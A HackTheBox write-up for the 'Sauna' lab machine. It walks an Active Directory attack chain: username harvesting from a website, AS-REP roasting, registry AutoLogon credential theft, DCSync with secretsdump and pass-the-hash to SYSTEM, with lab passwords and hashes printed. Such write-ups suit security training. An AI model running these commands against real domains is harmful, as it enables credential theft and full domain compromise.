# 📝 HTB — Sauna

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows — Active Directory  
**Attack Path:** Web OSINT → Username Generation → AS-REP Roast → AutoLogon Creds → DCSync → Domain Admin

---

## Machine Info

| Field | Value |
|-------|-------|
| IP | 10.10.10.175 |
| Domain | EGOTISTICAL-BANK.LOCAL |
| DC Hostname | SAUNA |
| OS | Windows Server 2019 |
| Key Techniques | AS-REP Roasting, AutoLogon registry creds, DCSync |

---

## Environment Setup

```bash
export ip=10.10.10.175
export domain=EGOTISTICAL-BANK.LOCAL
echo "$ip sauna.htb EGOTISTICAL-BANK.LOCAL sauna" >> /etc/hosts
mkdir -p scan enum creds loot
```

---

## Phase 1 — Recon

```bash
nmap -p- -T4 --min-rate=1000 -oN scan/nmap-full.txt $ip
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
  -sV -sC -oN scan/nmap-svc.txt $ip
```

**Key open ports:**

```
53    DNS
80    HTTP (IIS — company website)
88    Kerberos
135   RPC
389   LDAP
445   SMB
5985  WinRM
# Domain: EGOTISTICAL-BANK.LOCAL
```

---

## Phase 2 — Web OSINT → Username Generation

Port 80 runs a company website for "Egotistical Bank."  
The **About Us** page lists the full names of team members.

**Staff names found:**

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

**Generate username variations from names (common AD naming conventions):**

```bash
# Common formats tried:
# fsmith       → first initial + lastname
# fergus.smith → firstname.lastname
# f.smith      → f.lastname
# smithf       → lastname + first initial
# fergussmith  → firstnamelastname

# Build wordlist
cat > enum/users.txt << EOF
fsmith
fergus.smith
f.smith
fergussmith
scoins
shaun.coins
hbear
hugo.bear
btaylor
bowie.taylor
sdriver
sophie.driver
skerb
steven.kerb
hsmith
asmith
EOF
```

---

## Phase 3 — Kerbrute Validation

```bash
# Validate generated usernames against Kerberos
sudo ./kerbrute userenum enum/users.txt --dc $ip -d $domain | tee enum/raw-kerbrute.txt

# Valid users found:
# fsmith@EGOTISTICAL-BANK.LOCAL
# hsmith@EGOTISTICAL-BANK.LOCAL
```

---

## Phase 4 — AS-REP Roasting

```bash
# AS-REP roast valid users
sudo impacket-GetNPUsers $domain/ -usersfile enum/users.txt \
  -format hashcat -outputfile creds/asrep-hashes.txt -dc-ip $ip -no-pass

# fsmith is AS-REP roastable — hash obtained:
# $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
```

```bash
# Crack hash
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt
# Result: fsmith : Thestrokes23
```

---

## Phase 5 — Initial Foothold

```bash
export user=fsmith
export pass=Thestrokes23

# Verify
nxc smb $ip -u $user -p $pass
nxc winrm $ip -u $user -p $pass     # [+] confirms WinRM access

# Get shell
evil-winrm -i $ip -u $user -p $pass
```

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
[USER FLAG]
```

---

## Phase 6 — Local Enumeration → AutoLogon Credentials

Running WinPEAS or checking manually reveals AutoLogon credentials in the registry:

```bash
# Inside evil-winrm shell:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

**Registry output:**

```
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmgr
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

---

## Phase 7 — BloodHound → DCSync Path

```bash
# Collect data
sudo nxc ldap $ip -u svc_loanmgr -p 'Moneymakestheworldgoround!' \
  --bloodhound --collection All --dns-server $ip
```

**BloodHound finding:**

```
svc_loanmgr
  → [GetChanges + GetChangesAll] → EGOTISTICAL-BANK.LOCAL
```

`svc_loanmgr` has **DS-Replication-Get-Changes-All** extended right → DCSync attack.

---

## Phase 8 — DCSync → Domain Admin

```bash
# DCSync from Kali using svc_loanmgr credentials
sudo impacket-secretsdump $domain/svc_loanmgr:'Moneymakestheworldgoround!'@$ip \
  -just-dc-ntlm | tee loot/dcsync.txt

# Administrator hash:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
```

```bash
# Pass-the-Hash → SYSTEM shell
sudo impacket-psexec administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
[ROOT FLAG]
```

---

## Attack Chain Summary

```
nmap → port 80 open (company website)
  ↓
About Us page → 6 employee full names
  ↓
Generate username variations → users.txt
  ↓
kerbrute → fsmith + hsmith confirmed valid
  ↓
AS-REP roast → fsmith hash → hashcat → Thestrokes23
  ↓
evil-winrm → user.txt
  ↓
reg query Winlogon → svc_loanmgr : Moneymakestheworldgoround!
  ↓
BloodHound → svc_loanmgr has DCSync rights
  ↓
secretsdump → Administrator NTLM hash
  ↓
PSExec PTH → SYSTEM → root.txt
```

---

## Key Takeaways

```
1. Employee names on public websites → username generation → AS-REP roast (no creds needed)
2. AutoLogon registry key is a common credential storage location — always check
3. Service accounts with DS-Replication-Get-Changes-All = DCSync rights = game over
4. BloodHound is essential — manual enum alone would miss the DCSync edge
```

---

**MITRE ATT&CK:** T1558.004 (AS-REP Roasting) · T1552.002 (Registry Credentials) · T1003.006 (DCSync)

[← Back to Writeups](README.md)
